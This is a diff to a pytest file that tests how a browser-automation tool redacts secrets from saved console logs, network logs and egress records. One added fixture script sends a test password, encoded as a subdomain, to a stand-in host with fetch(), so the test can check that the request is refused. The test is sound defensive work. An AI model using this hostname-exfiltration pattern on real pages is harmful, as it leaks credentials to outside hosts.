@@ -11,6 +11,7 @@ from collections.abc import Iterator
 from contextlib import suppress
 from dataclasses import dataclass, replace
 from pathlib import Path
+from typing import Any
 from urllib.parse import quote, quote_plus
 
 import pytest
@@ -74,7 +75,7 @@ def saved(record: Path) -> dict[str, bytes]:
     }
 
 
-def logs(files: dict[str, bytes], folder: str) -> list[list[dict[str, object]]]:
+def logs(files: dict[str, bytes], folder: str) -> list[list[dict[str, Any]]]:
     """The console log's and the network log's entries in `folder`."""
     return [
         json.loads(files[f"{folder}/{name}"])["entries"]
@@ -82,7 +83,7 @@ def logs(files: dict[str, bytes], folder: str) -> list[list[dict[str, object]]]:
     ]
 
 
-def kinds(entries: list[dict[str, object]]) -> set[tuple[str, ...]]:
+def kinds(entries: list[dict[str, Any]]) -> set[tuple[str, ...]]:
     """The sets of keys `entries` hold."""
     return {tuple(sorted(entry)) for entry in entries}
 
@@ -178,6 +179,11 @@ def test_a_run_that_binds_a_secret_saves_no_url_method_or_console_text(
         assert {entry["text"] for entry in console} >= set(PIECES)
         assert {str(entry["url"]).split("/")[2] for entry in network} >= set(SPLIT)
         assert {entry["method"] for entry in network} >= set(PIECES)
+        assert (kinds(console), kinds(network)) == (
+            {("text", "type")},
+            {("method", "size", "status", "timing", "url")},
+        )
+        assert any(e["size"] and e["timing"]["duration_ms"] for e in network)
 
 
 def test_capturing_evidence_changes_no_observation_a_caller_takes(
@@ -397,6 +403,7 @@ def test_a_page_that_stops_answering_leaves_its_snapshot_out_within_the_budget(
     )
 
     assert [step.outcome for step in done.result.steps] == ["completed", "failed"]
+    assert sorted(saved(done.record.path / "evidence" / "0")) == list(FILES)
     assert sorted(saved(done.record.path / "evidence" / "1")) == list(FILES[1:])
     assert time.monotonic() - started < 20
 
@@ -404,8 +411,11 @@ def test_a_page_that_stops_answering_leaves_its_snapshot_out_within_the_budget(
 def test_a_replay_that_binds_but_never_fills_a_secret_withholds_its_logs(
     app: App, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    monkeypatch.setenv("AQA_SECRET_TEST_PASSWORD", FAKE_VALUE)
-    split = f"<script>({SPLITTING})({json.dumps(list(PIECES))})</script>"
+    # The page splits the bound value, and sends it whole as a refused host.
+    value = "".join(PIECES)
+    monkeypatch.setenv("AQA_SECRET_TEST_PASSWORD", value)
+    whole = f"fetch('http://{value}.fragment.test:4100/').catch(() => null)"
+    split = f"<script>({SPLITTING})({json.dumps(list(PIECES))}); {whole}</script>"
     monkeypatch.setitem(PAGES, "evidence-split", split)
     spec = secret_spec(tmp_path, start_url="/page/evidence-split")
 
@@ -417,3 +427,8 @@ def test_a_replay_that_binds_but_never_fills_a_secret_withholds_its_logs(
     files = saved(done.record.path / "evidence")
     assert (kinds(logs(files, "0")[0]), kinds(logs(files, "0")[1])) == WITHHELD
     assert holding(files, [*PIECES, *SPLIT]) == []
+    # The script fills nothing, so the egress record names hosts: scanned.
+    egress = (done.record.path / "egress.json").read_text()
+    refused = json.loads(egress)["refused"]
+    assert {"host": "[SECRET:TEST_PASSWORD].fragment.test", "port": 4100} in refused
+    assert value not in egress
